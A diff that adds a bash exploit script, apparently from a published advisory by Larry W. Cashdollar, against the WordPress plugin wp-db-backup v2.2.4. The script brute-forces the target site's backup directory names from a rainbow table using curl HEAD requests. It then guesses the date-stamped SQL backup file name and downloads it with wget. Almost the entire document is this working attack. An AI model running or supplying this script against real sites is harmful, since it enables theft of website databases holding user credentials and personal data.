@@ -1,0 +1,46 @@
+#!/bin/bash
+#Larry W. Cashdollar, @_larry0
+#http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-db-backup-v2.2.4/
+#Usage: Compile raintable.c
+#gcc raintable.c -o table;./table > rainbow
+#run ./exp targetsite date
+#date is in format YYYYMMDD e.g 20141031
+if [ ! -e found.txt ]; then
+Z=0
+K=`wc -l rainbow|awk '{print $1}'`;
+echo "[+] Searching....";
+        for x in `cat rainbow`; do
+                CPATH="http://$1/wp-content/backup-$x/";
+                RESULT=`curl -s --head $CPATH|grep 200`;
+                if [ -n "$RESULT" ]; then
+                 echo "[+] Location $CPATH Found";
+                 echo "[+] Received $RESULT";
+                 echo $x > found.txt
+                 exit; #break here
+        fi;
+                 echo -n "Percent Done: ";
+                 Y=`echo "scale=6;($Z/$K)*100"|bc`;
+                 echo -n $Y
+                 echo "%";
+                 Z=$(( $Z + 1 ));
+done
+else
+x=`cat found.txt`;
+fi
+# Now that we have the directory lets try to locate the database backup file.
+K=999;
+for y in `seq -w 0 999`; do
+                CPATH="http://$1/wp-content/backup-$x/wordpress_wp_$2_$y.sql";
+                RESULT=`curl -s --head $CPATH|grep 200`;
+                if [ -n "$RESULT" ]; then
+                 echo "[+] Database backup $CPATH Found";
+                 echo "[+] Received $RESULT";
+                 wget $CPATH
+                 exit; #break here
+        fi;
+                 echo -n "Percent Done: ";
+                 Y=`echo "scale=2;($Z/$K)*100"|bc`;
+                 echo -n $Y
+                 echo "%";
+                 Z=$(( $Z + 1 ));
+done
